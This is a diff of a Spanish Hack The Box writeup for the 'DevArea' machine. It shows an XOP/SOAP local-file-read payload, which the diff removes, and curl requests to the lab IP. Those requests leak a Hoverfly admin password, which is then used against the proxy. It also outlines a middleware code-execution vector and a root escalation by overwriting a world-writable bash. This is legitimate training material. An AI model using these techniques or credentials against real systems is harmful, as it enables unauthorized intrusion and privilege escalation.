@@ -5,6 +5,13 @@
 - **Dificultad**: Media 
 - **Resumen**: En este writeup se describe el proceso de enumeración y explotación de la máquina "DevArea" en Hack The Box. Se identificaron varios servicios abiertos, incluyendo FTP, SSH, HTTP y un servidor proxy. A través de la enumeración y el análisis de los servicios, se logró obtener acceso a la máquina y escalar privilegios para obtener la bandera.
 
+## WRITEUP VIDEO TUTORIAL 
+
+- Apoyate en el siguiente video para seguir el proceso de enumeración y explotación de la máquina DevArea. En este video se muestra paso a paso cómo se identificaron los servicios, se analizaron las vulnerabilidades y se explotaron para obtener acceso a la máquina.
+
+[![Video Tutorial DevArea](https://img.youtube.com/vi/VIDEO_ID/maxresdefault.jpg)](https://youtu.be/i0fHfo3QIsk)
+
+
 ## ENUMERACION 
 
 - NMAP
@@ -234,11 +241,11 @@ Tras descompilar las clases principales:
 
 ## TENTATIVAS DE EXPLOTACIÓN (Continuación)
 
-### 3. Enumeración de Credenciales
+### Enumeración de Credenciales
 - Se buscaron credenciales en el archivo `employee-service.jar` sin éxito.
 - Se probaron credenciales por defecto (`admin:admin`, `admin:hoverfly`, `admin:devarea`, `guest:guest`) en el panel de Hoverfly (8888) y el proxy (8500), todas sin éxito (Error 407 en el proxy).
 
-### 4. Análisis de Subdominios (VHosts)
+### Análisis de Subdominios (VHosts)
 - Se probaron manualmente subdominios comunes (`dev`, `api`, `ftp`, `hoverfly`, `environment`) redirigiendo todos a `devarea.htb`.
 - Se descubrió que `.htpasswd` en el puerto 80 devuelve un `403 Forbidden`, lo que sugiere su existencia pero con acceso restringido.
 
@@ -255,27 +262,9 @@ Se realizaron varias pruebas con cargas útiles XML y XOP:
 
 ## EXPLOTACIÓN - ACCESO COMO USUARIO DE SISTEMA (USER)
 
-### 1. Explotación de XXE/XOP (Local File Read)
+### Explotación de XXE/XOP (Local File Read)
 
-Aunque las pruebas iniciales con XXE clásico fallaron, el uso de **XOP (XML-binary Optimized Packaging)** permitió evadir las restricciones. Se utilizó una petición `multipart/related` para incluir un archivo local del sistema.
-
-**Payload de explotación (`xop_request.xml`):**
-
-```xml
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/" xmlns:xop="http://www.w3.org/2004/08/xop/include">
-   <soapenv:Header/>
-   <soapenv:Body>
-      <dev:submitReport>
-         <arg0>
-            <confidential>false</confidential>
-            <content><xop:Include href="cid:file"/></content>
-            <department>IT</department>
-            <employeeName>John Doe</employeeName>
-         </arg0>
-      </dev:submitReport>
-   </soapenv:Body>
-</soapenv:Envelope>
-```
+Aunque las pruebas iniciales con XXE clásico fallaron, el uso de **XOP (XML-binary Optimized Packaging)** permitió evadir las restricciones. 
 
 **Generación del Exploit (Python):**
 
@@ -363,7 +352,7 @@ curl -s -X POST http://10.129.244.208:8080/employeeservice \
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from John Doe. Department: IT. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
 ```
 
-### 2. Extracción de Credenciales
+### Extracción de Credenciales
 
 - Base64 decodificado:
 
@@ -398,11 +387,15 @@ Pero ... ¿Cómo se llega a la conclusión de solicitar el servicio hoverfly.ser
     * Indican el usuario bajo el cual corre el proceso (útil para saber a qué cuenta intentar acceder).
     * A menudo contienen la línea de comandos exacta (ExecStart) utilizada para iniciar el servicio.
 
-### 3. Acceso vía API y Middleware de Hoverfly
+### Acceso vía API y Middleware de Hoverfly
 
-Al notar que las credenciales no brindan acceso via SSH opte por interactuar con la API de Hoverfly (puerto 8888) ya que el escaneo de Nmap mostró que el puerto 8500 requiere autenticación (407 Proxy authentication required). Es muy probable que las credenciales de admin sean para este proxy.
+Al notar que las credenciales no brindan acceso via SSH opte por interactuar con la API de Hoverfly (puerto 8888) ya que el escaneo de Nmap mostró que el puerto 8500 requiere autenticación (407 Proxy authentication required). 
+```
+curl -x http://10.129.244.208:8500 http://127.0.0.1/
+407 Proxy authentication required
+```
 
-Intente utilizar el proxy con curl para ver si era posible acceder a servicios internos (como el puerto 80 local o archivos internos) que no son visibles desde fuera:
+Es muy probable que las credenciales de admin sean para este proxy. Por lo tanto intente utilizar el proxy con curl para ver si era posible acceder a servicios internos (como el puerto 80 local o archivos internos) que no son visibles desde fuera:
 ```
 curl -x http://admin:O7IJ27MyyXiU@10.129.244.208:8500 http://127.0.0.1/
 Hoverfly Error!
@@ -415,7 +408,8 @@ Este error confirma dos cosas:
    * La autenticación funciona: Las credenciales son válidas para el servicio Hoverfly.
    * Modo Simulación: Hoverfly está en modo simulate. En este modo, solo responde a peticiones que tiene "grabadas". Como no tiene grabada una petición a 127.0.0.1, da error.
 
-- Obteniendo Token JWT para la API de Hoverfly:
+
+### Obteniendo Token JWT para la API de Hoverfly:
 
 Hoverfly tiene una característica llamada Middleware. Si se tiene acceso administrativo (que ya la obtuvimos con las credenciales), se puede configurar un middleware que es, básicamente, un script o binario que se ejecuta cada vez que el proxy procesa una petición.
    * Vector: Usar la API para subir un script de middleware (por ejemplo, en
@@ -523,7 +517,7 @@ cat user.txt
 
 ## ESCALADA DE PRIVILEGIOS (ROOT)
 
-### 1. Enumeración de sudo
+### Enumeración de sudo
 
 Al ejecutar `sudo -l`, observamos que el usuario tiene permisos para ejecutar un script de monitoreo sin contraseña:
 
@@ -558,11 +552,11 @@ Commands:
   --help|-h|help      Show this help
 ```
 
-### 2. Análisis del Vector de Ataque
+### Análisis del Vector de Ataque
 
 El sistema presenta una vulnerabilidad crítica: el binario `/bin/bash` tiene permisos de escritura para todos los usuarios. Podemos aprovechar el script que se ejecuta con privilegios de root para manipular bash.
 
-### 3. Obtención de Root
+### Obtención de Root
 
 - El plan: sobrescribir /usr/bin/bash con un script falso que crea una copia de root SUID del bash real.
 
